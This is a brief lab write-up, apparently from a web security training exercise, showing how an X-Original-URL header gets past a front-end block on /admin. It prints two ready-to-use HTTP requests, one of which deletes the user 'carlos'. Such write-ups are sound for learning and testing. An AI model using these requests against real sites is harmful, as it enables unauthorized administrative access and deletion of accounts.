
# URL-based access control can be circumvented

This website has an unauthenticated admin panel at /admin, but a front-end system has been configured to block external access to that path. However, the back-end application is built on a framework that supports the X-Original-URL header.

To solve the lab, access the admin panel and delete the user carlos.

Accessing directly /admin returns a 403 error code:

It is possible to access /admin with:

```
GET / HTTP/2
...
X-Original-Url: /admin/
```

And the we can delete the user with this payload. The parameter â€œusername" must be in the URL:

```
GET /?username=carlos HTTP/2
X-Original-Url: /admin/delete
```
